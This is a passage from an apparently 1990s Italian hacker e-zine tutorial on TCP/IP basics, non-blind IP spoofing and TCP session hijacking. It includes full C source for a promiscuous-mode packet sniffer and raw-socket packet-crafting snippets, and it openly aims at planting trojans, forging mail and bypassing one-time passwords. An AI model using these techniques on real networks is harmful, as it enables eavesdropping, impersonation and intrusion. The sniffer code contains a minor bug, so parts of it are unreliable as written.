flag disponibili e' settata solo la SYN.

Poi il server risponde con le flag SYN ed ACK. Vediamo che l'ISN del
server e' diverso dall'ISN del client, ma notiamo che l'ACK e' uguale al
ISN del client + 1. A questo punto il client risponde con una flag ACK ed
il suo ACK e' uguale al ISN del server + 1.

A questo punto NON VI E' ANCORA STATO SCAMBIO DI DATI. Questo che abbiamo
visto e' chiamato il 3-way handshake. Ricapitolando:

    --------------------------------------------------------
    |							   | 
    |	         -----------  SYN  ----------->   	   |
    |	 CLIENT  <------ SYN ACK (ISN+1) ------  SERVER    |
    |		 ---------- ACK (ISN+1) ------>  	   |
    |							   |
    --------------------------------------------------------

A questo punto i due host sono connessi e possono inviare dati:

192.168.1.1:1025 > 192.168.1.2:23	SEQ:1118358510 ACK:4143819234
(TTL:64 Window:32120)			FLAGS: ---PA-

192.168.1.2:23 > 192.168.1.1:1025	SEQ:4143819234 ACK:1118358534
(TTL:64 Window:32712)			FLAGS: ----A-

Notiamo, grazie alla flag PSH, che il client invia dati al server. Il
server dal canto suo risponde con un ACK che e' uguale al SYN del client +
il numero di byte inviati, in questo caso 24.
In effetti ogni volta che un lato trasmette dati, questi devono essere
accettati dall'altro lato che deve inviare un ACK per mostrare di aver
riconosciuto i dati stessi. 
Le differenti flag di TCP stanno per:

-------------------------------------------------------------------------
|									|
|	SYN	SYNhronize	sincronizza i numeri SEQ		|
|	ACK	ACKnowledge	riconosce i dati inviati dal peer	|
|	FIN	FINished	l'origine ha finito di inviare dati	|
|	RST	ReSeT		rompi connessione			|
|	PSH	PuSH		invia dati al ricevente il prima	| 
|				possibile				|
|	URG	URGent		dati urgenti in arrivo dall'origine	|
|									|
-------------------------------------------------------------------------

Questo per quanto riguarda le basi di TCP.

------[ P R I M E  C O N S I D E R A Z I O N I ]------

Le connessioni come noi le conosciamo non sono delle rette infinite tra
noi ed il server, quanto piuttosto delle successioni di punti piu' o meno
vicini tra di loro, che seguono percorsi non sempre prevedibili.
E' altrettanto ovvio ora che se anche inserissimo dei pacchetti IP con gli
indirizzi IP spoofati, uguali ad una delle due parti della connessione in
corso, servirebbe ben poco. E se volessimo proprio iniziare la connessione
non basterebbe comunque. Primo, non vedremmo alcun dato tornare indietro,
in quanto il nostro reale indirizzo non sarebbe nei pacchetti ! Secondo
come potremmo indovinare l'ISN del server per mandargli un ACK uguale al
suo SEQ + 1 ?
Questi sono i classici dilemmi dell'iP SPOOFiNG. Per entrambi c'e' poco da
fare: se non siamo nella stessa LAN del server, o quanto meno sul tragitto
percorso dai pacchetti per andare dal server all'indirizzo che noi
spoofiamo, non POTREMO VEDERE MAI l'ISN del server. Ne' tantomeno i dati
di risposta del server. Punto. 

Si, Si, zitti voi espertoni. Essere sul tragitto puo' essere accomodato in
alcuni modi, ma per ora buoni ! ;)

Pero' se fossimo nella LAN o sul tragitto ..... esatto. Molto piu'
semplice. Qui bisogna distinguere tra due tipi di attacco che si possono
operare con lo SPOOFiNG: quello vedente e quello cieco.

Nel primo si opera mediante manipolazione dei numeri SEQ e ACK che sono
visibili mediante sniffing. Immaginiamo di aver scoperto che il server
pippo permette connessioni telnet attraverso il firewall solo da uno
specifico host remoto (politica errata, ma tant'e'). Ora noi siamo sull'
host pluto e vogliamo collegarci via telnet a pippo, avendo scoperto
alcune paia di login/password. Inviamo pacchetti IP, DUPLICANDO IN OGNI
MINIMA FUNZIONALITA' UN CLIENT TELNET, con lo stesso indirizzo del sistema
fidato. 

Il server pensando che sia davvero il remoto inviera' il suo SYN/ACK al
vero remoto. Solo che noi potremo sniffarlo ! E potremo quindi passare il
SYN al nostro codice per darlo in pasto a pippo e portare avanti la
connessione. Oltretutto potremo sniffare tutti i contenuti dei pacchetti
di pippo e vedere le risposte ai nostri dati.

Ma in un attacco cieco QUESTO NON SAREBBE POSSIBILE. Non vedremmo i dati.
E non vedremmo gli ISN. Gia', dovremmo proprio INDOVINARLI o quanto meno
PREVEDERLI.

Questo suddivide e identifica in maniera BI-univoca l'iP SPOOFiNG. Per
questo ho deciso che il progetto 0N0S3NDAi sia diviso nelle due parti
suddette. Per potere trattarle entrambe in maniera piu' esaustiva.

Quindi ora affrontiamo i temi e concetti dell'iP SPOOFiNG vedente; o non
cieco, che dir si voglia.

------[ V E D E R E  E' P O T E R E ]------

Questo e' ovviamente il cugino minore dell'iP SPOOFiNG della leggenda,
quello descritto e testato gia' da Morris. E' d'altra parte vero che anche
lo spoofing nobile, quello cieco, possa essere in qualche caso reso
vedente ma questo esula da queste prime pagine del progetto 0N0S3NDAi.

Parliamo invece dello spoofing vedente. 
In questo caso abbiamo tutto quello che ci serve ed il nostro compito e'
solo quello di operare diligentemente un controllo dei pacchetti in
transito e di prelevare ed inserire quanto ci occorra per portare avanti
una connessione TCP con il server. 

In pratica vediamo come attaccare un server. I punti da tenere a mente non
sono molti: 

1) dobbiamo monitorare la rete locale, o 1bis) il passaggio di
pacchetti dalla LAN obiettivo attraverso il nostro gateway.

2) accertarsi che il sistema che vogliamo impersonare sia fuori gioco. Ad
esempio offline, vittima di un DOS o di un malfunzionamento ...

3) iniziare la connessione.

4) prelevare grazie al punto 1 l'ISN del server e creare una risposta
corretta

5) inviare i nostri dati mantenendo sott'occhio l'andamento dei numeri SEQ
ed ACK della connessione TCP.

Il punto 2 e' decisamente importante. Infatti i pacchetti di risposta che
noi spiamo, e che il server manda all'indirizzo reale di cui abbiamo
assunto l'identita', arrivano al sistema remoto. Se questi e' in grado di
rispondere, fara' chiudere la connessione al server rispondendo con un RST
per comunicare di non aver mai aperto la connessione.

E' quindi ovvio che punto fondamentale e' poter spiare i pacchetti nella
rete. Qui entra in gioco lo sniffer.

------[ S N I F F  S N I F F ]------

Uno sniffer e', in questo caso, un pezzo di codice. PURO SOFTWARE. Niente
scatolette da collegare a chissa' quale cavo. O pensavate di dover
incollare ageggi astrusi ai cavi che vi passano sotto le strade ? [cosa
che non sarebbe affatto inutile ;) ]

Linux, al pari di altri sistemi operativi, fornisce uno strumento che
permette di accedere a quel livello dove passano i pacchetti incapsulati
negli header delle interfacce di rete.

I metodi piu' comuni sono BPF o BSD Packet Filter, DLPI o Data Link
Provider Interface e, sotto Linux appunto, SOCK_PACKET.

Quindi dobbiamo creare un socket di tipo SOCK_PACKET. Per farlo dobbiamo
avere privilegi di superutente (leggi root). La chiamata dev'essere:

	fd = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ALL));

dove il terzo argomento a socket() specifica il tipo di maschera Ethernet.
In questo caso li riceveremmo tutti. Se volessimo invece ricevere solo
pacchetti IP dovremmo specificare:

	fd = socket(AF_INET, SOCK_PACKET, htons(ETH_P_IP));

Gli altri valori sono contenuti in <linux/if_ether.h>:

#define ETH_P_LOOP      0x0060          /* Ethernet Loopback packet     */
#define ETH_P_ECHO      0x0200          /* Ethernet Echo packet         */
#define ETH_P_PUP       0x0400          /* Xerox PUP packet             */
#define ETH_P_IP        0x0800          /* Internet Protocol packet     */
#define ETH_P_X25       0x0805          /* CCITT X.25                   */
#define ETH_P_ARP       0x0806          /* Address Resolution packet    */
#define ETH_P_BPQ       0x08FF          /* G8BPQ AX.25 Ethernet Packet  */
#define ETH_P_DEC       0x6000          /* DEC Assigned proto		*/
#define ETH_P_DNA_DL    0x6001          /* DEC DNA Dump/Load            */
#define ETH_P_DNA_RC    0x6002          /* DEC DNA Remote Console       */
#define ETH_P_DNA_RT    0x6003          /* DEC DNA Routing              */
#define ETH_P_LAT       0x6004          /* DEC LAT                      */
#define ETH_P_DIAG      0x6005          /* DEC Diagnostics              */
#define ETH_P_CUST      0x6006          /* DEC Customer use             */
#define ETH_P_SCA       0x6007          /* DEC Systems Comms Arch       */
#define ETH_P_RARP      0x8035          /* Reverse Addr Res packet      */
#define ETH_P_ATALK     0x809B          /* Appletalk DDP                */
#define ETH_P_AARP      0x80F3          /* Appletalk AARP               */
#define ETH_P_IPX       0x8137          /* IPX over DIX                 */
#define ETH_P_IPV6      0x86DD          /* IPv6 over bluebook           */
 
Questo non basta. Come visto in BFI2 dobbiamo anche mettere l'interfaccia
in modalita' promiscua. Per far questo abbiamo bisogno di una chiamata a
ioctl per agire su di una struttura di tipo ifreq, per leggerne dapprima
le flag mediante SIOCGIFFLAGS e poi settare la flag IFF_PROMISC con
SIOCSIFFLAGS.
La struct ifreq e le flags sono contenute in <linux/if.h> :

struct ifreq
{
#define IFHWADDRLEN     6
#define IFNAMSIZ        16
        union
        {
                char    ifrn_name[IFNAMSIZ];    
        } ifr_ifrn;

        union {
                struct  sockaddr ifru_addr;
                struct  sockaddr ifru_dstaddr;
                struct  sockaddr ifru_broadaddr;
                struct  sockaddr ifru_netmask;
                struct  sockaddr ifru_hwaddr;
                short   ifru_flags;
                int     ifru_metric;
                int     ifru_mtu;
                struct  ifmap ifru_map;
                char    ifru_slave[IFNAMSIZ];   /* Just fits the size */
                caddr_t ifru_data;
        } ifr_ifru;
};

/* Standard interface flags. */
#define IFF_UP          0x1             /* interface is up              */
#define IFF_BROADCAST   0x2             /* broadcast address valid      */
#define IFF_DEBUG       0x4             /* turn on debugging            */
#define IFF_LOOPBACK    0x8             /* is a loopback net            */
#define IFF_POINTOPOINT 0x10            /* interface is has p-p link    */
#define IFF_NOTRAILERS  0x20            /* avoid use of trailers        */
#define IFF_RUNNING     0x40            /* resources allocated          */
#define IFF_NOARP       0x80            /* no ARP protocol              */
#define IFF_PROMISC     0x100           /* receive all packets          */

A questo punto possiamo operare sui dati letti nei soliti modi permessi
dalle funzioni di input/output del C. Abbiamo quindi un descrittore un po'
particolare che fornira' notevoli quantita' di dati.

Allego SLS, un semplice sniffer per Linux che sfrutta la modalita'
SOCK_PACKET. Quella che allego e' solo una versione ridotta. Non controlla
i pacchetti, non logga alcun contenuto, e da info solo su TCP, UDP e ICMP.
Come al solito seguo i consigli di |scacco| nel concedere idee e soluzioni
ma NON tutte =:P

------------------------ taglia qui --------------------------------------

/************************************************************************
* sls.c			Simple Linux Sniffer v.0.3			*
*									*
*			semplice sniffer di rete in grado di monitorare *
*			pacchetti IP con header TCP, UDP e ICMP.	* 
*			Il codice fa uso del particolare tipo di socket *
*			SOCK_PACKET implementato SOLO su Linux al posto *
*			dei vari NIT, BPF, DLPI dei vari SVr4 e BSD4.4+ *
*			per raggiungere il livello 'datalink'.		*
*			Porta l'interfaccia di rete eth0 in modalita'	*
*			promiscua, permettendole di accogliere anche i	*
*			pacchetti non specificatamente indirizzati ad	*
*			essa. Un semplice signal_catcher rimuove quella *
*			flag IFF_PROMISC in caso di interruzione o kill	*
*			del programma.					*
*									*
* OS:			Linux (SOCK_PACKET)				*
*									*
* 				NO(C)1998 FuSyS TCP/IP Tools Unlimited	*
************************************************************************/

/*
*   SPECIAL TNX TO CODER@REPTILE FOR HIS IDEAS AND WORK
*/ 

#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/icmp.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>

#define		MTU			1500
#define 	URG                     32
#define		ACK_PSH			24
#define		SYN_ACK			18
#define		FIN_ACK			17
#define 	ACK                     16
#define 	PSH                     8
#define 	RST                     4
#define 	SYN                     2
#define 	FIN                     1
#define		ETH			"eth0"	
#define		ETH_HD			14

int sniff;
int tcp_cn = 1;
int udp_cn = 1;

struct packet_info {
	unsigned char ttl;
	unsigned char protocol;
	unsigned char *saddr, *daddr;
	unsigned long seq, ack_seq;
	unsigned short source, dest;
	unsigned short type, id;
	unsigned short flags;
	unsigned short window;
	char *dataload;
};

struct TCPhdr {
	unsigned short source, dest;
        unsigned long seq, ack_seq;
        unsigned short offset_flag, window, checksum, urgent;
};


int init()
{
	int fd;
	struct ifreq eth;
	if( (fd = socket(AF_INET, SOCK_PACKET, htons(0x3))) < 0) {
		fprintf(stderr, "Can't open RAW Socket.\n");
		exit(1);
	}
	strcpy(eth.ifr_ifrn.ifrn_name, ETH);
	if ( ioctl(fd, SIOCGIFFLAGS, &eth) < 0) {
		fprintf(stderr, "Can't get Ethernet flags.\n");
		exit(1);
	}
	eth.ifr_ifru.ifru_flags |= IFF_PROMISC ;
	if ( ioctl(fd, SIOCSIFFLAGS, &eth) < 0) {
		fprintf(stderr, "Can't put Ethernet in PROMISC mode.\n");
		exit(1);
	}
	if ( fcntl(fd,F_SETOWN, getpid()) < 0) {
		fprintf(stderr, "Can't set SOCK_PACKET Ownership.\n");
		exit(1);
	}
	return fd;
}

int sniff_pk(int fd, struct packet_info *infoz)
{
	int pk_len;
	char sniff_buff[MTU];
	struct iphdr *IP;
	struct TCPhdr *TCP;
	struct udphdr *UDP;
	struct icmphdr *ICMP;
	char data[MTU];

	memset(sniff_buff, '\0', MTU);
        memset(data, '\0', MTU);
	pk_len = read(fd, sniff_buff, MTU);
	if (read > 0) {
		pk_len -= ETH_HD;
		memcpy(data, sniff_buff+ETH_HD, pk_len);
		IP = (struct iphdr *) data;
		infoz->ttl = IP->ttl;
		infoz->protocol = (char)IP->protocol;
		infoz->saddr = (unsigned char *)&(IP->saddr);
		infoz->daddr = (unsigned char *)&(IP->daddr);
		switch (infoz->protocol) {
			case IPPROTO_TCP:
			TCP = (struct TCPhdr *)(data+20);
			infoz->seq = ntohl(TCP->seq);
			infoz->ack_seq = ntohl(TCP->ack_seq);
			infoz->source = ntohs(TCP->source);
			infoz->dest = ntohs(TCP->dest);
			infoz->window = ntohs(TCP->window);
			infoz->flags = ntohs(TCP->offset_flag)&
					(URG|ACK|PSH|FIN|RST|SYN);
			infoz->dataload = (char *)(data +
				(sizeof(struct iphdr)+sizeof(struct TCPhdr)));
			break;
		 	case IPPROTO_UDP:
			UDP = (struct udphdr *)(data+20);
			infoz->source = ntohs(UDP->source);
			infoz->dest = ntohs(UDP->dest);
			infoz->dataload = (char *)(data +
				(sizeof(struct iphdr)+sizeof(struct udphdr)));
			break;
			case IPPROTO_ICMP:
			ICMP = (struct icmphdr *)(data+20);
			infoz->type = ntohs(ICMP->type);
			infoz->id = ntohs(ICMP->un.echo.sequence);
			break;
			default:
			break;
		}
	}
	return pk_len;		
}

void ethclose()
{
	struct ifreq eth;
	strcpy(eth.ifr_ifrn.ifrn_name, ETH);
        if ( ioctl(sniff, SIOCGIFFLAGS, &eth) < 0) {
                fprintf(stderr, "Can't get Ethernet flags.\n");
                exit(1);
        }
        eth.ifr_ifru.ifru_flags ^= IFF_PROMISC ;
        if ( ioctl(sniff, SIOCSIFFLAGS, &eth) < 0) {
                fprintf(stderr, "Can't put Ethernet in PROMISC mode.\n");
                exit(1);	
	}
	exit(0);
}

void dump_tcp(struct packet_info info, int data)
{
	int count = 1;
	char *flags;
	
	printf("\nTCP Packet #%i\n", tcp_cn++);
        printf("%u.%u.%u.%u:%i > %u.%u.%u.%u:%i\tSEQ:%u ACK:%u\n",
         	info.saddr[0],info.saddr[1],info.saddr[2],
                info.saddr[3], info.source, info.daddr[0],
                info.daddr[1], info.daddr[2], info.daddr[3],
                info.dest, info.seq, info.ack_seq);
                printf("(TTL:%i Window:%i)\t\t\t", info.ttl, info.window);

	switch (info.flags) {
		case URG:
                	flags="-----U";
                        break;
                case ACK_PSH:
                        flags="---PA-";
                        break;
                case SYN_ACK:
                        flags="-S--A-";
                        break;
                case FIN_ACK:
                        flags="F---A-";
                        break;
                case ACK:
                        flags="----A-";
                        break;
                case PSH:
                        flags="---P--";
                        break;
                case RST:
                        flags="--R---";
                        break;
                case SYN:
                        flags="-S----";
                        break;
                case FIN:
                        flags="F-----";
			break;
		default:
			break;
	}
	printf("FLAGS: %s\n", flags);
        if (data == 1) {
        	printf("DATA ->\t\t%s\n", info.dataload);
        }			
}

void dump_udp(struct packet_info info, int data)
{
	int count = 1;

        printf("\nUDP Packet #%i\n", udp_cn++);
	printf("%u.%u.%u.%u:%i > %u.%u.%u.%u:%i\t\t(TTL:%i)\n",
		info.saddr[0],info.saddr[1],info.saddr[2],
		info.saddr[3], info.source, info.daddr[0],
                info.daddr[1], info.daddr[2], info.daddr[3],
                info.dest, info.ttl);
        if (data == 1) {
                printf("DATA ->\t\t%s\n", info.dataload);
        }
}

void dump_icmp(struct packet_info info)
{
	printf("\nICMP Packet\n");
        printf("%u.%u.%u.%u > %u.%u.%u.%u \ticmp : ",
                info.saddr[0],info.saddr[1],info.saddr[2],
                info.saddr[3], info.daddr[0], info.daddr[1], 
		info.daddr[2], info.daddr[3]);
        switch((info.type/256)) {
		case 0:
			printf("echo reply\t");
			break;
		case 3:
			printf("dest_unreach\t");
			break;
		case 4:
			printf("source quench\t");
			break;
		case 5:
			printf("redirect\t");
			break;
		case 8:
			printf("echo\t");
			break;
		case 11:
			printf("time exceeded\t");
			break;
		case 12:
			printf("parameter problem\t");
			break;
		case 13:
			printf("timestamp\t");
			break;
		case 14:
			printf("timestamp reply\t");
			break;
		case 15:
			printf("information\t");
			break;
		case 16:
			printf("information reply\t");
			break;
		case 17:
			printf("address mask\t");
			break;
		case 18:
			printf("address mask reply\t");
			break;
		default:
			printf("%i\t", info.type);
			break;
	}
	printf("(ttl:%i id:%i)\n", info.ttl, (info.id/256));
}

int main(int argc, char **argv)
{
	int snoop = 0, opt;
	struct packet_info pk_info;

	printf("\nSiMPLE LiNUX SNiFFER - v.0.3 - NO(C)1998 FuSyS\n\n");

	while ((opt = getopt(argc, argv, "v")) != EOF) {
                switch(opt)
                {
			case 'v':
				snoop=1;
				break;
			default:
				exit(1);
				break;
		}
	}

	signal(SIGINT, ethclose);
        signal(SIGTERM, ethclose);
	signal(SIGKILL, ethclose);
	signal(SIGQUIT, ethclose);

	sniff = init();
	while(1) {
		sniff_pk(sniff, &pk_info);
		switch(pk_info.protocol) {
			case IPPROTO_TCP:
				dump_tcp(pk_info, snoop);
				break;
			case IPPROTO_UDP:
				dump_udp(pk_info, snoop);
				break;
			case IPPROTO_ICMP:
				dump_icmp(pk_info);
				break;
			default:
				break;
		}
	}
}

------------------------ taglia qui --------------------------------------

L'output di questo sniffer e' decisamente semplice, senza fronzoli:

SiMPLE LiNUX SNiFFER - v.0.3 - NO(C)1998 FuSyS

TCP Packet #1
192.168.1.1:1025 > 192.168.1.2:23	SEQ:1118358509 ACK:0
(TTL:64 Window:512)			FLAGS: -S----

TCP Packet #2
192.168.1.2:23 > 192.168.1.1:1025	SEQ:4143819233 ACK:1118358510
(TTL:64 Window:32736)			FLAGS: -S--A-

TCP Packet #3
192.168.1.1:1025 > 192.168.1.2:23	SEQ:1118358510 ACK:4143819234
(TTL:64 Window:32120)			FLAGS: ----A-

TCP Packet #4
192.168.1.1:1025 > 192.168.1.2:23	SEQ:1118358510 ACK:4143819234
(TTL:64 Window:32120)			FLAGS: ---PA-

TCP Packet #5
192.168.1.2:23 > 192.168.1.1:1025	SEQ:4143819234 ACK:1118358534
(TTL:64 Window:32712)			FLAGS: ----A-

TCP Packet #6
192.168.1.2:23 > 192.168.1.1:1025	SEQ:4143819234 ACK:1118358534
(TTL:64 Window:32712)			FLAGS: ---PA-

TCP Packet #7
192.168.1.1:1025 > 192.168.1.2:23	SEQ:1118358534 ACK:4143819246
(TTL:64 Window:32120)			FLAGS: ---PA-

Sinceramente ero indeciso se rilasciare o meno SLS ed altro codice che
seguira' nel progetto 0N0S3NDAi, ma ho deciso di farlo comunque.
Semplicemente non ne discuto le caratteristiche piu' di tanto. In modo che
dobbiate leggervi il sorgente per capire come funziona o cosa fargli fare.
L'unica funzione che tutto sommato devo descrivere e' sicuramente:

int sniff_pk(int fd, struct packet_info *infoz);

In effetti capire questa funzione facilitera' molto la comprensione della
creazione di pacchetti IP. Per cominciare, questa funzione viene chiamata
in sls.c con riferimento ad un descrittore (quello della chiamata socket)
ed una struttura in cui copiare dati relativi ai pacchetti spiati, per
poterli poi visualizzare ....
In sniff_pk leggiamo dal socket e copiamo in un secondo buffer quanto
letto tralasciando l'header della interfaccia di rete. A quel punto
incolliamo su questo buffer un puntatore ad una struttura di tipo iphdr
che contiene i valori dell'header IP descritto prima, e che vedremo meglio
dopo. Copiamo gli indirizzi IP ed il valore del protocollo, ed a seconda
di questo, usiamo puntatori ad altre strutture di tipo udphdr, icmphdr e
TCPhdr, nuova che ricorda la comune tcphdr, ma il cui controllo delle
flags e' piu' immediato. A seconda del puntatore usato copiamo alcuni
valori nella struttura di riporto. 

Ovviamente dopo aver incollato l'header IP sul buffer non possiamo puntare
allo stesso offset anche quello TCP o UDP. Dovremo considerare le
dimensioni dei vari header e spostare in avanti il puntatore, conoscendo
le dimensioni dell'header IP.

------[ R A W  S O C K E T S ]------

SI. Per l'iP SPOOFiNG abbiamo bisogno di generare pacchetti IP. E per
farlo dobbiamo usare dei socket di tipo RAW. Specificando un protocollo di
tipo RAW. E definendo anche l'opzione IP_HDRINCL, per poter manipolare
anche l'header IP del datagramma.
Quindi le chiamate successive che dobbiamo effettuare sono:

int fd, option = 1;

descrittore e intero entro cui definire lo stato dell'opzione

fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW));
	
per aprire un socket di tipo RAW, seguita poi da

setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &option, sizeof(option));

per avere liberta' nella creazione anche dell'header IP, o di alcuni suoi
campi. A questo punto ci sono due possibili alternative. Possiamo definire
un buffer, sopra il quale apporre puntatori a strutture che definiscano
gli header dei protocolli. Oppure definire strutture, formate dai singoli
header necessari seguiti dai buffer per i dati.

Nel primo caso ad esempio:

char buffer[1500];
struct tcphdr *newtcp;
struct iphdr *newip;
ip = (struct iphdr *) (buffer);
tcp = (struct tcphdr *) (buffer+20);

ricordo che 20 e' la dimensione in byte dell'header IP senza opzioni. Se
volessimo creare un pacchetto dotato di opzioni dovremmo calcolarne le
dimensioni ed aggiungrle a quel 20, altrimenti la struttura TCP verrebbe
sovrapposta agli ultimi byte occupati da quella di IP.

A questo punto potremmo definire immediatamente i valori degli header:

ip->ttl = 64;
ip->saddr = resolver_function("xxx.xxx.xxx.xxx");
tcp->source = htons(6500);
tcp->dest = htons(23);
tcp->ack_seq = htonl(ack_guess);

Per poi inviare con sendto() il nostro buffer ...

Oppure come secondo metodo possiamo definire delle strutture come:

struct spoof {
        struct ip       iphdr;
        struct icmp     icmphdr;
        u_char          data[MAXMESG];
} sp_pk;

che contengano le stesse strutture di cui sopra. Per poi manipolarle in
modo analogo:

sp_pk.ip.ip_v = 4;
sp_pk.ip.ip_hl = 5;
sp_pk.ip.ip_len = htons(iplen + icmplen + mesglen);
sp_pk.ip.ip_ttl = 255;
sp_pk.ip.ip_p = IPPROTO_ICMP;
sp_pk.ip.ip_src.s_addr = sp_ip;
sp_pk.ip.ip_dst.s_addr = dest_ip;
sp_pk.icmp.icmp_type = ICMP_ECHOREPLY;

A questo punto bisogna avere bene in mente le strutture di cui sopra per
poterle adeguatamente manipolare nella creazione di pacchetti IP spoofati.
Queste strutture sono contenute in <linux/ip.h>, <linux/tcp.h>, <linux/udp.h>, 
<linux/icmp.h> ....... vediamo per l'appunto queste piu' importanti:

IP

struct iphdr {
#if defined(__LITTLE_ENDIAN_BITFIELD)
        __u8    ihl:4,
                version:4;
#elif defined (__BIG_ENDIAN_BITFIELD)
        __u8    version:4,
                ihl:4;
#else
#error  "Please fix <asm/byteorder.h>"
#endif
        __u8    tos;
        __u16   tot_len;
        __u16   id;
        __u16   frag_off;
        __u8    ttl;
        __u8    protocol;
        __u16   check;
        __u32   saddr;
        __u32   daddr;
        /*The options start here. */
};

TCP

struct tcphdr {
        __u16   source;
        __u16   dest;
        __u32   seq;
        __u32   ack_seq;
#if defined(__LITTLE_ENDIAN_BITFIELD)
        __u16   res1:4,
                doff:4,
                fin:1,
                syn:1,
                rst:1,
                psh:1,
                ack:1,
                urg:1,
                res2:2;
#elif defined(__BIG_ENDIAN_BITFIELD)
        __u16   doff:4,
                res1:4,
                res2:2,
                urg:1,
                ack:1,
                psh:1,
                rst:1,
                syn:1,
                fin:1;
#else
#error  "Adjust your <asm/byteorder.h> defines"
#endif
        __u16   window;
        __u16   check;
        __u16   urg_ptr;
};

UDP

struct udphdr {
  unsigned short        source;
  unsigned short        dest;
  unsigned short        len;
  unsigned short        check;
};

ICMP

struct icmphdr {
  __u8          type;
  __u8          code;
  __u16         checksum;
  union {
        struct {
                __u16   id;
                __u16   sequence;
        } echo;
        __u32   gateway;
  } un;
};

[Per quanto riguarda l'header ICMP vi rimando al progetto NiNJA, sempre in
questo numero di BFI.]

Probabilmente vi sara' saltato all'occhio l'uso di alcune funzioni come
htons, htonl, inet_addr, inet_ntoa ed altre .... [per maggiori info
consultate la man page byteorder(3) e inet(3) ].
Questo perche' le informazioni inviate via rete devono essere inserite
nello stream nello stesso modo per tutte le macchine impegnate in una
connessione. Questo modo prende il nome di BYTE ORDER. Ne esistono due
varianti: LITTLE-ENDIAN e BIG-ENDIAN.

Nel primo caso le informazioni sono inserite partendo dal low-order byte a
salire, ovvero partendo dal cosiddetto LSB, Least Significant Bit. Nel
secondo invece vengono memorizzate dal MSB, Most Significant Bit a salire.

E' piu' facile immaginare uno short = 0x0102.

	-------------------------------->
						BIG-ENDIAN
	|	01	|	02	|

						LITTLE-ENDIAN
	|	02	|	01	|	


Non esiste uno standard. Ogni sistem apuo' usare quello che preferisce.
Alcuni li usano entrambi. Linux su x86 e' ad esempio una macchina
LITTLE_ENDIAN. In ogni caso il sistema adottato dall'host prende il nome
di host byte order. Il corrispondente network byte order e' invece di tipo
BIG_ENDIAN. Quindi dovremo adottare delle funzioni che convertano i valori
dall'uno all'altro prima di trasferirli, o dopo averli ricevuti.

Ad esempio, htons sta per Host To Network Short e converte il valore
contenuto in uno short da little a big endian su di una macchina linux.
Ovvio che se fossimo su una macchina che usa l'host byte order uguale al
network, quindi big-endian, potremmo non usare queste funzioni o definirne
di fake tanto per non perdere in stilismo :) e portabilita'.

Ovviamente creare qualche pacchetto e gestire una connessione spoofata
sono due cose differenti. Pero' lo spoofing vedente puo' prendere anche
una forma piu' occulta ed interessante: l'HIJACKING della connessione.
Con questo termine si intende il dirottamento di una connessione TCP in
corso per inserire dati estranei al posto del client legale che stava
portando avanti la trasmissione dei dati. 

Questo puo' essere utile in molti casi: basti pensare alla possibilita' di
aspettare in agguato una mail da parte di un cliente, e di variare il
contenuto del campo DATA che segue i due MAIL FROM: e RCPT TO: per creare
il prototipo della perfetta fake mail :) .... o magari inserire un file
troyan al posto di uno legale chiesto in FTP dal nostro bersaglio .... per
non parlare della possibilita' di passare autenticazioni ostiche come le
ONE-Time password che cambiano ad ogni login, o le procedure crittografiche 
mediante token, o tipo Kerberos .... potremmo aspettare che i due host siano 
connessi per prendere poi il posto del client ed eseguire comandi sul
server al posto suo, inserendoci nella connessione !!!

------[ H I J A C K I N G ]------

Questo termine significava letteralmente, ai tempi del proibizionismo, 
'rubare alcolici ai contrabbandieri'. Il termine e' poi passato, secondo 
la piu' pura tradizione analogica informatica, a designare il rapimento,
furto o dirottamento di dati in transito. Non possiamo eseguire cioe'
l'hijack di un file in una directory, ma possiamo farlo quando questo
viene trasmesso da un capo all'altro di una connessione dati.

In questo frangente l'iP SPOOFiNG e' una vera e propria manna dal cielo.
Vediamo di che cosa si tratta:


	CLIENT <------------------/-----------------> SERVER
				  |			|
		    ...	<-------------------------------/
				  |
       SPOOFER -------------------/ 


Il client instaura una normale connessione con il server. Entrambi passano
nello stato ESTABLISHED. L'attacco viene portato inserendo dei pacchetti
nel flusso della connessione, che desincronizzino lo stato della
trasmissione legale ed alterino la coppia SEQ/ACK del server agli occhi
del client. In questo modo esso non sara' in grado di inviare dati e
continuera' a ritrasmettere i propri numeri attesi, mentre l'attaccante
potra' continuare ad inserire dati nel server apparendo proprio come se
fosse il client vero. Ma come avviene questo ?

Ora identifico il client come A, il server come Z.
Dapprima A e Z eseguono il famoso 3-way handshake di TCP:

			A(ISNa, SYN) > Z
		    Z(ISNz, ACK[ISNa+1], SYN|ACK) > A
			A(ACK[ISNz+1], ACK) > Z

Dove ISN sta per il numero SEQ iniziale e SYN|ACK sono flag TCP.
Dopodiche' cominciano a trasmettere dati, sapendo che ogni byte trasmesso
provoca sempre l'ACK dell'altro capo:

			A(SEQ, ACK, A|P) > Z
		Z(SEQ[ACKa], ACK[SEQa+BYTE], A) > A

Vediamo cioe' che il SEQ del server e' uguale all'ACK del client (che nel
setup della connessione era l'ISN del server + 1), mentre il suo ACK e'
uguale al SEQ del client piu' il numero di byte trasmessi. In questo modo
TCP e' in grado di discriminare tra pacchetti esatti ed erronei.
Possiamo vedere questo con un semplice log operato da SLS:

TCP Packet #1
192.168.1.1:1025 > 192.168.1.2:23	SEQ:1118358509 ACK:0
(TTL:64 Window:512)			FLAGS: -S----

TCP Packet #2
192.168.1.2:23 > 192.168.1.1:1025	SEQ:4143819233 ACK:1118358510
(TTL:64 Window:32736)			FLAGS: -S--A-

TCP Packet #3
192.168.1.1:1025 > 192.168.1.2:23	SEQ:1118358510 ACK:4143819234
(TTL:64 Window:32120)			FLAGS: ----A-

Ora i due host sono nello stato ESTABLISHED.

TCP Packet #4
192.168.1.1:1025 > 192.168.1.2:23	SEQ:1118358510 ACK:4143819234
(TTL:64 Window:32120)			FLAGS: ---PA-

TCP Packet #5
192.168.1.2:23 > 192.168.1.1:1025	SEQ:4143819234 ACK:1118358534
(TTL:64 Window:32712)			FLAGS: ----A-

Il client ha trasmesso 24 byte di dati. Lo intuiamo dalla risposta del
server che comunica con un ACK uguale al SEQ del client + 24 (1118358534 -
1118358510)

TCP Packet #6
192.168.1.2:23 > 192.168.1.1:1025	SEQ:4143819234 ACK:1118358534
(TTL:64 Window:32712)			FLAGS: ---PA-

TCP Packet #7
